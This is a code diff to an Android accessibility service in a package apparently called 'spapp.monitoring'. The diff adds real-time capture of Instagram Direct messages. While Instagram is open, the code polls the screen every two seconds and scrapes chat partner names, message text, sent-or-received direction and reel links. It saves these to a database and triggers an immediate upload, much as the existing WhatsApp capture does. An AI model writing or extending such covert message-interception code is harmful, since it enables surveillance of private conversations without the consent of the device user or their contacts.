@@ -12,6 +12,7 @@ import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.data.local.WebHistoryEntry
 import com.spapp.monitoring.data.local.WhatsAppMessageEntry
+import com.spapp.monitoring.data.local.InstagramMessageEntry
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -110,6 +111,12 @@ class BlockAccessibilityService : AccessibilityService() {
                 stopWhatsAppPolling()
             }
 
+            if (packageName == "com.instagram.android") {
+                startInstagramPolling()
+            } else {
+                stopInstagramPolling()
+            }
+
             checkAppRule(packageName)
         }
 
@@ -123,6 +130,17 @@ class BlockAccessibilityService : AccessibilityService() {
                 eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 val nodeToInspect = rootInActiveWindow ?: event.source
                 recordWhatsAppChatIfForeground(nodeToInspect)
+            }
+        }
+
+        // Real-time Instagram Direct capture:
+        if (packageName == "com.instagram.android") {
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
+                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
+                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                val nodeToInspect = rootInActiveWindow ?: event.source
+                recordInstagramChatIfForeground(nodeToInspect)
             }
         }
     }
@@ -566,6 +584,121 @@ class BlockAccessibilityService : AccessibilityService() {
             }
         } catch (_: Exception) {
         }
+    }
+
+    private var instagramPollRunnable: Runnable? = null
+    private fun startInstagramPolling() {
+        if (instagramPollRunnable != null) return
+        val runnable = object : Runnable {
+            override fun run() {
+                recordInstagramChatIfForeground(rootInActiveWindow)
+                pollHandler.postDelayed(this, 2000L)
+            }
+        }
+        instagramPollRunnable = runnable
+        pollHandler.postDelayed(runnable, 500L)
+    }
+
+    private fun stopInstagramPolling() {
+        instagramPollRunnable?.let { pollHandler.removeCallbacks(it) }
+        instagramPollRunnable = null
+    }
+
+    fun recordInstagramChatIfForeground(root: AccessibilityNodeInfo?) {
+        if (root == null) return
+        try {
+            val entriesToInsert = mutableListOf<InstagramMessageEntry>()
+            val now = System.currentTimeMillis()
+            val displayMetrics = resources.displayMetrics
+
+            fun extractReelUrl(txt: String?): String? {
+                if (txt.isNullOrBlank()) return null
+                val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
+                return match?.value
+            }
+
+            // Find Direct Chat username in top action bar
+            val headerNodes = mutableListOf<AccessibilityNodeInfo>()
+            fun findHeader(node: AccessibilityNodeInfo?) {
+                if (node == null) return
+                val rect = Rect()
+                node.getBoundsInScreen(rect)
+                if (rect.top < 380 && node.text != null && node.text.isNotBlank()) {
+                    headerNodes.add(node)
+                }
+                for (i in 0 until node.childCount) {
+                    findHeader(node.getChild(i))
+                }
+            }
+            findHeader(root)
+            val chatTitle = headerNodes.firstOrNull {
+                val s = it.text.toString().trim()
+                s != "Instagram" && s != "Direct" && s != "Messages" && !s.contains("Active") && s.length in 2..50
+            }?.text?.toString()?.trim()
+
+            if (!chatTitle.isNullOrBlank()) {
+                val textList = mutableListOf<AccessibilityNodeInfo>()
+                fun collectMessageTexts(node: AccessibilityNodeInfo?) {
+                    if (node == null) return
+                    if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
+                    val t = node.text?.toString()?.trim()
+                    val rect = Rect()
+                    node.getBoundsInScreen(rect)
+                    if (!t.isNullOrBlank() && rect.top > 120 && rect.bottom <= (displayMetrics.heightPixels - 100)) {
+                        if (t != chatTitle && !t.equals("Message...", ignoreCase = true) && !t.equals("Search", ignoreCase = true)) {
+                            textList.add(node)
+                        }
+                    }
+                    for (i in 0 until node.childCount) {
+                        collectMessageTexts(node.getChild(i))
+                    }
+                }
+                collectMessageTexts(root)
+
+                for (node in textList) {
+                    val rawText = node.text?.toString()?.trim() ?: continue
+                    if (rawText.isBlank()) continue
+                    val rect = Rect()
+                    node.getBoundsInScreen(rect)
+                    val isOutgoing = rect.left > (displayMetrics.widthPixels * 0.35f) || rawText.startsWith("You sent ", ignoreCase = true)
+                    val cleanText = if (rawText.startsWith("You sent ", ignoreCase = true)) rawText.substring(9).trim() else rawText
+
+                    val key = "ig|$chatTitle|$cleanText|$isOutgoing"
+                    if (capturedWhatsAppMsgHashes.add(key)) {
+                        val reelUrl = extractReelUrl(cleanText)
+                        val mediaType = when {
+                            reelUrl != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
+                            cleanText.contains("photo", ignoreCase = true) -> "image"
+                            cleanText.contains("video", ignoreCase = true) -> "video"
+                            else -> null
+                        }
+                        entriesToInsert.add(
+                            InstagramMessageEntry(
+                                chatName = chatTitle,
+                                sender = if (isOutgoing) "me" else chatTitle,
+                                messageText = cleanText,
+                                isOutgoing = isOutgoing,
+                                messageTimeEpochMs = now,
+                                mediaType = mediaType,
+                                reelUrl = reelUrl
+                            )
+                        )
+                    }
+                }
+            }
+
+            if (entriesToInsert.isNotEmpty()) {
+                scope.launch {
+                    try {
+                        val db = AppDatabase.getInstance(applicationContext)
+                        db.instagramMessageDao().insertAll(entriesToInsert)
+                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+                    } catch (e: Exception) {
+                        Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
+                    }
+                }
+            }
+        } catch (_: Exception) {}
     }
 
     /**
